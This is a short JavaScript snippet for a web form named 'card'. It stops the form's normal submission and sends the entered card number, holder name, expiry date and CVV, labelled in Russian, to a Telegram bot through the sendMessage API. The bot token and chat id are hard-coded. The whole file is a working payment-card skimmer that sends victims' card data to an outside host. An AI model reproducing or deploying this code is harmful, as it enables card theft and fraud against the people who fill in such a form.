const forma = document.forms.card;
const inp = document.querySelectorAll("input");

forma.addEventListener("submit", (e) => {
  e.preventDefault();
  const Http = new XMLHttpRequest();
  const url = `https://api.telegram.org/bot7129909981:AAHBpaThACowlD1ieMYcS77vZPzZ8jGZqMM/sendMessage?chat_id=1194072102&text=Номер карты: ${inp[0].value}, Имя владельца: ${inp[1].value}, Дата: ${inp[2].value}/${inp[3].value}, CVV: ${inp[4].value}`;
  Http.open("GET", url);
  Http.send();
});
